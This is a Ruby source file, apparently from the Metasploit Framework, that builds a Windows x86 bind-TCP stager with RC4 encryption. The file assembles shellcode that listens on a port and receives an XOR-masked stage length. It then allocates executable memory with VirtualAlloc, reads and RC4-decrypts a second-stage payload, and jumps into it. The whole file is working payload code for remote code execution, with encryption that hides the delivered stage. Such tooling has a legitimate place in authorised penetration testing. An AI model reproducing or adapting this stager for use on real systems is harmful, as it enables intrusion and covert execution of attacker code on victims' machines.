# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/bind_tcp'
require 'msf/core/payload/windows/rc4'

module Msf

###
#
# Complex bind_tcp_rc4 payload generation for Windows ARCH_X86
#
###

module Payload::Windows::BindTcpRc4

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows::BindTcp
  include Msf::Payload::Windows::Rc4

  #
  # Generate the first stage
  #
  def generate
    xorkey, rc4key = rc4_keys(datastore['RC4PASSWORD'])
    conf = {
      port:     datastore['LPORT'],
      xorkey:      xorkey,
      rc4key:      rc4key,
      reliable: false
    }

    # Generate the more advanced stager if we have the space
    if self.available_space && required_space <= self.available_space
      conf[:exitfunk] = datastore['EXITFUNC']
      conf[:reliable] = true
    end

    generate_bind_tcp_rc4(conf)
  end

  #
  # Generate and compile the stager
  #
  def generate_bind_tcp_rc4(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_bind_tcp(opts)}
      #{asm_block_recv_rc4(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  def asm_block_recv_rc4(opts={})
    xorkey = Rex::Text.to_dword(opts[:xorkey]).chomp
    reliable     = opts[:reliable]
    asm = %Q^
      recv:
        ; Receive the size of the incoming second stage...
        push 0                  ; flags
        push 4                  ; length = sizeof( DWORD );
        push esi                ; the 4 byte buffer on the stack to hold the second stage length
        push edi                ; the saved socket
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
        call ebp                ; recv( s, &dwLength, 4, 0 );
    ^

    # Check for a failed recv() call
    if reliable
      asm << %Q^
        cmp eax, 0
        jle failure
      ^
    end

    asm << %Q^
      ; Alloc a RWX buffer for the second stage
        mov esi, [esi]         ; dereference the pointer to the second stage length
          xor esi, #{xorkey}   ; XOR the stage length
          lea ecx, [esi+0x100] ; ECX = stage length + S-box length (alloc length)
        push  0x40             ; PAGE_EXECUTE_READWRITE
        push 0x1000            ; MEM_COMMIT
      ; push esi               ; push the newly recieved second stage length.
          push ecx             ; push the alloc length
        push 0                 ; NULL as we dont care where the allocation is.
        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
        call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
      ; Receive the second stage and execute it...
      ; xchg ebx, eax          ; ebx = our new memory address for the new stage + S-box
          lea ebx, [eax+0x100] ; EBX = new stage address
        push ebx               ; push the address of the new stage so we can return into it
          push esi             ; push stage length
          push eax             ; push the address of the S-box
      read_more:               ;
        push  0                ; flags
        push esi               ; length
        push ebx               ; the current address into our second stage's RWX buffer
        push edi               ; the saved socket
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
        call ebp               ; recv( s, buffer, length, 0 );
    ^

    # Check for a failed recv() call
    if reliable
      asm << %Q^
        cmp eax, 0
        jle failure
      ^
    end

    asm << %Q^
      read_successful:
        add ebx, eax           ; buffer += bytes_received
        sub esi, eax           ; length -= bytes_received
      ; test esi, esi          ; test length
        jnz read_more          ; continue if we have more to read
          pop ebx              ; address of S-box
          pop ecx              ; stage length
          pop ebp              ; address of stage
          push ebp             ; push back so we can return into it
          push edi             ; save socket
          mov edi, ebx         ; address of S-box
          call after_key       ; Call after_key, this pushes the address of the key onto the stack.
          db #{raw_to_db(opts[:rc4key])}
      after_key:
        pop esi                ; ESI = RC4 key
      #{asm_decrypt_rc4}
        pop edi                ; restore socket
      ret                      ; return into the second stage
    ^

    if reliable
      if opts[:exitfunk]
        asm << %Q^
      failure:
        ^
        asm << asm_exitfunk(opts)
      else
        asm << %Q^
      failure:
        push #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
        call ebp
        ^
      end
    end

    asm
  end

end

end

